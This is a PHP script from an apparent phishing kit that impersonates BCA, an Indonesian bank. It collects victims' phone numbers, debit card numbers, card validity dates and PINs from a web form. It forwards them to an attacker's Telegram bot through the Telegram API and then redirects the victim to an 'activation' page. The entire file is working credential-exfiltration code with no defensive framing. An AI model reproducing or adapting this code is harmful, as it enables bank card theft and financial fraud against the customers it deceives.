<?php 



session_start();
include "./telegram.php";

$_SESSION["nomor"] = $_POST ['nomor'];
$_SESSION["debit"] = $_POST ['debit'];
$_SESSION["valid"] = $_POST ['valid'];
$_SESSION["pin"] = $_POST ['pin'];

$message = "
( BCA | DATA )

- NoHP : ".$_POST ['nomor']."
- Valid: ".$_POST ['valid']."
- Kartu : ".$_POST ['debit']."
- PIN  : ".$_POST ['pin'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  aktivasi.html");
?> 
